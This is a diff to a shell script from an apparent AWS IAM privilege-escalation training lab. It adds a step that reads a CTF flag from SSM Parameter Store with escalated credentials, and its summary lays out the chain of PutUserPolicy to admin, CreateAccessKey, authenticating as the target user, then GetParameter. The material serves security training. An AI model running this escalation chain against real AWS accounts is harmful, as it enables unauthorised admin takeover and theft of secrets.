@@ -253,12 +253,28 @@ else
 fi
 echo ""
 
+# [EXPLOIT] Step 10: Capture CTF flag from SSM Parameter Store
+# The target user now has an inline policy granting AdministratorAccess, which includes
+# ssm:GetParameter. Use the target user credentials (still active) to read the flag.
+echo -e "${YELLOW}Step 10: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/iam-018-to-admin"
+show_attack_cmd "Attacker (target user, now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Final summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER"
@@ -266,9 +282,10 @@ echo "2. Added admin inline policy to: $TARGET_USER_NAME"
 echo "3. Created access keys for: $TARGET_USER_NAME"
 echo "4. Authenticated as: $TARGET_USER_NAME"
 echo "5. Achieved: Administrator access"
+echo "6. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
-echo "  $STARTING_USER → (PutUserPolicy) → $TARGET_USER_NAME → (CreateAccessKey) → Authenticate as $TARGET_USER_NAME → Admin"
+echo "  $STARTING_USER → (PutUserPolicy) → $TARGET_USER_NAME → (CreateAccessKey) → Authenticate as $TARGET_USER_NAME → Admin → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
